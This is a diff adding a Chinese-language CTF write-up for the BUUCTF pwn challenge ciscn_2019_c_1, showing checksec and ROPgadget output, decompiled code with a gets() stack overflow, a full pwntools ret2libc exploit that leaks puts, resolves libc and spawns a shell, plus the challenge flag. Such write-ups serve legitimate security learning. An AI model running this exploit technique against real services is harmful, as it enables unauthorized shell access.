@@ -1661,6 +1661,171 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_c_1](https://buuoj.cn/challenges#ciscn_2019_c_1)
+
+先`file ./ciscn_2019_c_1`查看文件类型再`checksec --file=./ciscn_2019_c_1`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./ciscn_2019_c_1
+./ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./ciscn_2019_c_1
+[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_c_1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`ciscn_2019_c_1`，，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h] BYREF
+
+  init(argc, argv, envp);
+  puts("EEEEEEE                            hh      iii                ");
+  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
+  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
+  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
+  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
+  puts("====================================================================");
+  puts("Welcome to this Encryption machine\n");
+  begin();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      fflush(0LL);
+      v4 = 0;
+      __isoc99_scanf("%d", &v4);
+      getchar();
+      if ( v4 != 2 )
+        break;
+      puts("I think you can do it by yourself");
+      begin();
+    }
+    if ( v4 == 3 )
+    {
+      puts("Bye!");
+      return 0;
+    }
+    if ( v4 != 1 )
+      break;
+    encrypt();
+    begin();
+  }
+  puts("Something Wrong!");
+  return 0;
+}
+```
+
+输入`1`可调用`encrypt()`函数，双击`encrypt()`函数查看详情，`char`型数组`s`的可用栈大小为`0x50`字节，且`gets()`函数并不能限制`s`从标准输入中读取的字节长度，显然存在栈溢出漏洞。
+
+```c
+int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h] BYREF
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 >= strlen(s) )
+      break;
+    if ( s[x] <= 96 || s[x] > 122 )
+    {
+      if ( s[x] <= 64 || s[x] > 90 )
+      {
+        if ( s[x] > 47 && s[x] <= 57 )
+          s[x] ^= 0xFu;
+      }
+      else
+      {
+        s[x] ^= 0xEu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xDu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+```
+
+在`Functions window`中并没有看到`system()`函数，`ROPgadget`也查不到，我们需要利用`gets()`函数的栈溢出漏洞来泄露出`puts()`函数的地址。由于题目并没有给出`libc.so.6`的版本，所以我们需要借助`LibcSearcher`来计算出`libc`的基地址，进而求得`system()`函数和`/bin/sh`的地址，最后劫持控制流获得靶机的`shell`权限。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400c83`，`ret`的地址为`0x4006b9`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./ciscn_2019_c_1 --only "pop|ret"  
+Gadgets information
+============================================================
+0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c80 : pop r14 ; pop r15 ; ret
+0x0000000000400c82 : pop r15 ; ret
+0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004007f0 : pop rbp ; ret
+0x0000000000400aec : pop rbx ; pop rbp ; ret
+0x0000000000400c83 : pop rdi ; ret
+0x0000000000400c81 : pop rsi ; pop r15 ; ret
+0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006b9 : ret
+0x00000000004008ca : ret 0x2017
+0x0000000000400962 : ret 0x458b
+0x00000000004009c5 : ret 0xbf02
+
+Unique gadgets found: 15
+```
+
+编写`Python`代码求解，得到`flag{ba4ddc51-c524-4cfe-93fd-911f7a10f2ef}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+io = remote('node4.buuoj.cn', 26769)
+elf = ELF('./ciscn_2019_c_1')
+pop_rdi = 0x400c83 # pop rdi; ret
+ret = 0x4006b9 # ret
+main_addr = elf.symbols['main']
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+io.sendlineafter(b'Input your choice!', b'1')
+payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
+io.recvuntil(b'Ciphertext\n')
+io.recvline()
+puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
+log.info('puts_address => 0x%x', puts_addr)
+libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
+libcbase = puts_addr - libc.dump('puts')
+log.success('libcbase_address => %s', hex(libcbase))
+system_addr = libcbase + libc.dump('system')
+log.success('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+log.success('bin_sh_address => %s', hex(bin_sh_addr))
+payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+io.sendlineafter(b'Input your choice!', b'1')
+io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
